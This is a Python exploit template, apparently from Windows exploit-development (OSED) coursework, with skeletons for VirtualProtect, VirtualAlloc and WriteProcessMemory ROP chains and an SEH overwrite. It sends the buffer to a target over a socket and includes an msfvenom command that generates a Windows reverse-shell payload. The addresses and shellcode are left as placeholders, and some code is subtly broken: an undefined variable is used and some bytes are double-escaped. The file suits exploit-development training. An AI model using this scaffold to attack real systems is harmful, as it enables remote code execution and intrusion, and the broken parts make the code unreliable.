#!/usr/bin/python3
"""
exploit-template.py - Template for creating exploits with ROP chains

This template provides pre-configured skeletons for common ROP chain patterns:
- VirtualProtect (change memory protections)
- VirtualAlloc (allocate new executable memory)
- WriteProcessMemory (write shellcode to code cave)
- SEH overwrites

Usage:
    1. Copy this template to your working directory
    2. Fill in the offsets, addresses, and gadgets
    3. Add your shellcode
    4. Run and test!
"""
import sys
import socket
from typing import Optional

sys.path.insert(0, '../../osed-scripts')
from utils import RopChain, sanity_check, get_connection


# Common bad characters - update based on your target
bad_chars = [0, 0xa, 0xd, 0x2b, 0x25, 0x26, 0x3d]


def get_payload() -> bytes:
    """
    Generate or load shellcode payload.

    Returns:
        Shellcode bytes

    Example:
        Use msfvenom to generate shellcode:
        msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=54321 \\
            -b '\\x0a\\x0d\\x2b\\x25\\x26\\x3d\\x00' -v shellcode -f python
    """
    # msfvenom -p windows/shell_reverse_tcp lhost=eth0 lport=54321 -b '\x0a\x0d\x2b\x25\x26\x3d\x00' -v shellcode -f python
    shellcode = b''

    return shellcode


def get_rop_chain() -> bytes:
    """
    Build the ROP chain for the exploit.

    This function contains templates for common ROP chains. Uncomment and
    fill in the appropriate template for your exploit.

    Returns:
        Complete ROP chain as bytes
    """
    # ========== VirtualProtect ROP Chain Template ==========
    # BOOL VirtualProtect(
    #   LPVOID lpAddress,        - Address of memory to change protection
    #   SIZE_T dwSize,            - Size of memory region
    #   DWORD  flNewProtect,      - New protection (0x40 = PAGE_EXECUTE_READWRITE)
    #   PDWORD lpflOldProtect     - Pointer to variable receiving old protection
    # );
    #
    # Find VirtualProtect address:
    #   !py mona rop -m module.dll -cp nonull
    #   or manually: locate kernel32.dll and find VirtualProtect
    #
    # skeleton = RopChain()
    # skeleton += 0x41414141                # VirtualProtect address (find with !py mona rop)
    # skeleton += 0x42424242                # Return address (where to jump after VirtualProtect)
    # skeleton += 0x43434343                # lpAddress (address of shellcode, often ESP)
    # skeleton += 0x44444444                # dwSize (size of shellcode, 0x300 should be enough)
    # skeleton += 0x45454545                # flNewProtect (0x40 for RWX)
    # skeleton += 0x46464646                # lpflOldProtect (any writable address)
    # -------------------------
    #
    # ========== VirtualAlloc ROP Chain Template ==========
    # LPVOID VirtualAlloc(
    #   LPVOID lpAddress,          - NULL to let system choose address
    #   SIZE_T dwSize,              - Size of region to allocate
    #   DWORD  flAllocationType,    - 0x1000 = MEM_COMMIT
    #   DWORD  flProtect            - 0x40 = PAGE_EXECUTE_READWRITE
    # );
    #
    # skeleton  = RopChain()
    # skeleton += 0x41414141                # VirtualAlloc address
    # skeleton += 0x42424242                # Return address (points to shellcode)
    # skeleton += 0x43434343                # lpAddress (NULL = 0x00000000, let system choose)
    # skeleton += 0x44444444                # dwSize (size of shellcode)
    # skeleton += 0x45454545                # flAllocationType (0x1000 = MEM_COMMIT)
    # skeleton += 0x46464646                # flProtect (0x40 = RWX)
    # -------------------------
    #
    # ========== WriteProcessMemory ROP Chain Template ==========
    # BOOL WriteProcessMemory(
    #   HANDLE  hProcess,                  - Process handle (0xffffffff = current)
    #   LPVOID  lpBaseAddress,              - Code cave address
    #   LPCVOID lpBuffer,                   - Source buffer (shellcode location)
    #   SIZE_T  nSize,                      - Number of bytes to write
    #   SIZE_T  *lpNumberOfBytesWritten     - Pointer to receive bytes written
    # );
    #
    # Find code cave:
    #   !py mona jmp -r esp
    #   or search for writable + executable section
    #
    # skeleton  = RopChain()
    # skeleton += 0x41414141                # WriteProcessMemory address
    # skeleton += 0x42424242                # Return address (jump to code cave)
    # skeleton += 0xffffffff                # hProcess (0xffffffff = current process)
    # skeleton += 0x44444444                # lpBaseAddress (code cave address)
    # skeleton += 0x45454545                # lpBuffer (current shellcode location)
    # skeleton += 0x46464646                # nSize (size of shellcode)
    # skeleton += 0x47474747                # lpNumberOfBytesWritten (any writable address)
    # -------------------------

    # ========== Configure Your Exploit Here ==========
    ropnop = 0x0              # ROP NOP gadget (e.g., "ret" instruction)
    offset_to_eip = 0         # Offset from buffer start to EIP (find with pattern_offset)

    # Build the final exploit buffer
    rop = RopChain(chain=b'A' * (offset_to_eip - len(skeleton)))
    rop += skeleton.chain

    # Add your ROP gadgets here
    rop += 0x0  # Example: start of ROP chain

    ############################
    # Register State Tracking
    # -------------------------
    # Track register values before PUSHAD
    # to ensure correct stack alignment:
    #
    # EAX =>
    # EBX =>
    # ECX =>
    # EDX =>
    # ESI =>
    # EDI =>
    # ESP =>
    # EBP =>
    # -------------------------
    # Stack Layout After PUSHAD:
    # [ESP+0x00] = EDI
    # [ESP+0x04] = ESI
    # [ESP+0x08] = EBP
    # [ESP+0x0C] = ESP (original value)
    # [ESP+0x10] = EBX
    # [ESP+0x14] = EDX
    # [ESP+0x18] = ECX
    # [ESP+0x1C] = EAX
    # -------------------------
    # Example: Setting up registers for VirtualProtect
    # EAX => nop (must return to ESP)
    # ECX => lpflOldProtect (writable address)
    # EDX => flNewProtect (0x40)
    # EBX => dwSize (0x201)
    # ESP => lpAddress (shellcode address)
    # EBP => VirtualProtect address
    # ESI => RET gadget (to execute VirtualProtect)
    # EDI => ROP NOP (optional)
    ############################

    # NOP sled before shellcode (helps with alignment)
    rop += b'\x90' * 20

    # Add the actual payload
    rop += get_payload()

    # Verify no bad characters in the final chain
    sanity_check(rop.chain, bad_chars)

    return rop.chain


def get_seh_overwrite() -> bytes:
    """
    Build an SEH overwrite exploit.

    SEH (Structured Exception Handling) exploits overwrite the exception
    handler chain to gain control of execution flow.

    Returns:
        Complete SEH exploit buffer

    Notes:
        - Find SEH offset using pattern_create/pattern_offset
        - nSEH should contain a short jump to skip over SEH
        - SEH should contain address of "pop r32; pop r32; ret" gadget
        - Use !py mona seh or find-ppr.py to find suitable gadgets
    """
    total_len = 0              # Total buffer length allowed
    offset_to_seh = 0          # Offset to SEH handler (find with pattern_offset)

    # Build SEH exploit buffer
    seh_chain  = b'A' * (offset_to_seh - 4)

    # nSEH: Next SEH record (usually a short jump over SEH)
    # Common values:
    #   \\xEB\\x06\\x90\\x90 = short jump 6 bytes forward
    #   \\xEB\\x08\\x90\\x90 = short jump 8 bytes forward
    seh_chain += b'\\xEB\\x06\\x90\\x90'  # nSEH: short jump over SEH handler

    # SEH: Exception handler address (pop pop ret gadget)
    # Find with: !py mona seh -m module.dll -cp nonull
    # or: find-ppr.py -m module1 module2 -b 00 0a 0d
    seh_chain += b'\\x00\\x00\\x00\\x00'  # SEH: pop; pop; ret gadget address

    # Add shellcode or additional ROP chain after SEH
    seh_chain += get_payload()

    # Pad to total length if needed
    if total_len > len(seh_chain):
        seh_chain += b'C' * (total_len - len(seh_chain))

    sanity_check(seh_chain, bad_chars)
    return seh_chain


def send_exploit(sock: socket.socket, buffer: bytes, read_response: bool = False) -> None:
    """
    Send the exploit buffer to the target.

    Args:
        sock: Connected socket to the target
        buffer: Exploit buffer to send
        read_response: Whether to read and print the response
    """
    sock.send(buffer)
    print(f'[+] sent {len(buffer)} bytes')

    if read_response:
        resp = sock.recv(4096)
        print('[*] response:')
        print(resp)


def main() -> None:
    """
    Main exploit function.

    Update the IP address and port to match your target.
    Choose between get_rop_chain() or get_seh_overwrite() based on your exploit type.
    """
    # TODO: Update target IP and port
    target_ip = '127.0.0.1'
    target_port = 111

    print(f"[*] Connecting to {target_ip}:{target_port}")
    conn = get_connection(target_ip, target_port)
    print("[+] Connected!")

    print("[*] Sending exploit...")
    send_exploit(conn, get_rop_chain())  # or get_seh_overwrite()
    print("[+] Exploit sent!")

    # Keep connection open to interact with shell if applicable
    try:
        conn.close()
    except Exception:
        pass


if __name__ == '__main__':
    main()